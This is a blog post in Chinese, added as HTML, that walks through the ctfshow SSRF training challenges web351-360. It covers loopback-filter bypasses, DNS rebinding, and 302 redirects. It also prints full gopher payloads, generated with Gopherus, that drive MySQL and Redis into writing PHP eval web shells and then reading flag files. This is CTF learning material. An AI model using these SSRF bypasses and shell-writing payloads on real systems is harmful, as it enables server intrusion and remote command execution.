@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ja1e.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="127.0.0.1绕过、域名指向、302跳转、DNS重定向、gopher打mysql、redis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_web入门_ssrf">
+<meta property="og:url" content="https://ja1e.github.io/2022/08/09/ctfshowssrf/index.html">
+<meta property="og:site_name" content="Ja1e">
+<meta property="og:description" content="127.0.0.1绕过、域名指向、302跳转、DNS重定向、gopher打mysql、redis">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-09T13:10:33.000Z">
+<meta property="article:modified_time" content="2022-08-09T18:14:27.730Z">
+<meta property="article:author" content="Ja1e">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ja1e.github.io/2022/08/09/ctfshowssrf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow_web入门_ssrf | Ja1e</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ja1e</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Ja1e的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ja1e.github.io/2022/08/09/ctfshowssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ja1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ja1e">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow_web入门_ssrf
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-09 21:10:33" itemprop="dateCreated datePublished" datetime="2022-08-09T21:10:33+08:00">2022-08-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-10 02:14:27" itemprop="dateModified" datetime="2022-08-10T02:14:27+08:00">2022-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">127.0.0.1绕过、域名指向、302跳转、DNS重定向、gopher打mysql、redis</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p>
+<p>就是让服务器去请求服务器的资源，因为我们远程请求不到。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>curl_init()：初始curl会话</li>
+<li>curl_setopt()：会话设置</li>
+<li>curl_exec()：执行curl会话,获取内容</li>
+<li>curl_close()：会话关闭</li>
+</ul>
+<p><strong>gopher协议</strong><br>通过gopher协议，将请求体用url编码后加上任意字符,一般是下划线，接上gopher的url即可执行GET、POST请求</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/_[stream]</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p>如果我们直接访问flag.php，会提示不允许外网访问，所以我们需要利用ssrf。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>服务器处理这个值的时候，就是curl本机的flag.php文件。</p>
+<h1 id="web352、353"><a href="#web352、353" class="headerlink" title="web352、353"></a>web352、353</h1><p>post接收url参数，然后用parse_url函数，将返回值给x</p>
+<p>parse_url函数用法：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-url.php">PHP: parse_url - Manual</a></p>
+<p>题目就是说，必须要用http或者https协议，然后不能使用localhost|127.0.0字符串。</p>
+<p>我们需要绕过localhost|127.0.0，用0可以代替127.0.0.1</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>另外的绕过方法：</p>
+<ul>
+<li><strong>127.1</strong>会被解析成127.0.0.1，也就意味着为零可缺省</li>
+<li>在Linux中，<strong>0</strong>也会被解析成127.0.0.1</li>
+<li>127.0.0.0&#x2F;8是一个环回地址网段，从<strong>127.0.0.1 ~ 127.255.255.254</strong>都表示localhost</li>
+<li>ip地址还可以通过表示成其他<strong>进制</strong>的形式访问，<a target="_blank" rel="noopener" href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IP地址二进制、十进制、十六进制互换</a></li>
+</ul>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.255.255.254/flag.php</span><br><span class="line">url=http://2130706433/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p>过滤了localhost、1、0</p>
+<p>1和0都过滤了那我们之前的payload就不好用了。</p>
+<p><strong>方法一：域名指向</strong></p>
+<p>在自己的域名中添加一条A记录指向 127.0.0.1</p>
+<p>或者使用 <code>http://sudo.cc</code>这个域名就是指向127.0.0.1</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://sudo.cc/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：302跳转</strong></p>
+<p>在自己的vps网页页面添加：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这样当服务器接收到我们传自己vps的域名时候，去curl它然后就会被重定向到自己127.0.0.1的flag.php文件。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://xxxxx/xxx.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p>过滤，限制<code>http://[host]/[path]</code> host部分长度小于5</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[POST]payload：url=http://127.1/flag.php</span><br><span class="line">[POST]payload：url=http://0/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p>过滤，限制<code>http://[host]/[path]</code> host部分长度小于3</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[POST]payload：url=http://0/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p>因为代码中使用了 gethostbyname 获取了真实 IP 地址，所以域名指向方法不能再使用，可以使用 <strong>302 跳转方法和 dns rebinding 方法</strong></p>
+<p><strong>DNS rebinding（DNS重新绑定攻击）</strong></p>
+<p>攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，<strong>第二次是攻击目标IP地址</strong>，甚至可以通过这种攻击方法绕过同源策略</p>
+<p>回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 <a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a> 来实现攻击。</p>
+<p>去<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a> 注册账号，在个人信息页面，点击下面的<code>+ New DNS</code>，添加127.0.0.1和39.156.66.10（随便一个可用的ip）。</p>
+<p>翻阅ceye的DNS Rebinding页面的介绍，有这么一句话：</p>
+<blockquote>
+<p>If your identifier is <code>abcdef.ceye.io</code>, then your DNS rebinding host is <code>r.abcdef.ceye.io</code>.</p>
+</blockquote>
+<p>所以要使用DNS重定向，我们要在域名前面加上<code>r.</code></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://r.xxxxx.ceye.io/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>要多点几次</strong></p>
+<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p>正则，必须要以<code>http://ctf.</code>开头，以show结尾</p>
+<ul>
+<li>当<code>parse_url()</code>解析到邮箱时：**@前面是user**</li>
+<li><code>file_get_contents()</code>会访问<code>host:port/path</code>，与user无关</li>
+</ul>
+<p>因此构建payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1><p>题目提示：打无密码的mysql</p>
+<p>一个登录界面，点击登录，抓包发现可疑<strong>参数 returl 存在 SSRF</strong></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>，选择mysql模块，默认用户root，sql注入语句写个shell文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py  --exploit mysql</span><br><span class="line"></span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select &quot;&lt;?php eval($_POST[cmd]); ?&gt;&quot; into outfile &quot;/var/www/html/cmd.php&quot;;</span><br><span class="line">Your gopher link is ready to do SSRF :</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%20%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%63%6d%64%2e%70%68%70%22%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure>
+
+<p>还需要进行一次url编码（从<code>_</code>开始），payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2520%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2563%256d%2564%255d%2529%253b%2520%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2563%256d%2564%252e%2570%2568%2570%2522%253b%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>
+
+<p>然后访问cmd.php，post：cmd&#x3D;system(‘cat &#x2F;flag.txt’);</p>
+<h1 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h1><p>利用gopher协议打redis也可以用Gopherus</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gopherus.py  --exploit redis</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you want?? (ReverseShell/PHPShell): php</span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[cmd]); ?&gt;</span><br><span class="line">Your gopher <span class="built_in">link</span> is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5Bcmd%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it<span class="string">&#x27;s done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.</span></span><br></pre></td></tr></table></figure>
+
+<p>payload要把它再进行一次URLEncode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255Bcmd%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>
+
+<p>再访问<code>/shell.php</code>执行命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;cat /flaaag&quot;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>学习链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.ucloud.cn/yun/121452.html">CTFshow刷题日记-WEB-SSRF（web351-360）SSRF总结 - UCloud云社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/114988116">(11条消息) CTFshow_Web_SSRF——web351~web360（除354、357）_Ho1aAs的博客-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="ctfshow_web入门_文件包含">
+      <i class="fa fa-chevron-left"></i> ctfshow_web入门_文件包含
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">SSRF基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web351"><span class="nav-number">2.</span> <span class="nav-text">web351</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web352%E3%80%81353"><span class="nav-number">3.</span> <span class="nav-text">web352、353</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web354"><span class="nav-number">4.</span> <span class="nav-text">web354</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web355"><span class="nav-number">5.</span> <span class="nav-text">web355</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web356"><span class="nav-number">6.</span> <span class="nav-text">web356</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web357"><span class="nav-number">7.</span> <span class="nav-text">web357</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web358"><span class="nav-number">8.</span> <span class="nav-text">web358</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web359"><span class="nav-number">9.</span> <span class="nav-text">web359</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web360"><span class="nav-number">10.</span> <span class="nav-text">web360</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ja1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ja1e" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ja1e" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:eveee428@proton.me" title="E-Mail → mailto:eveee428@proton.me" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ja1e</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
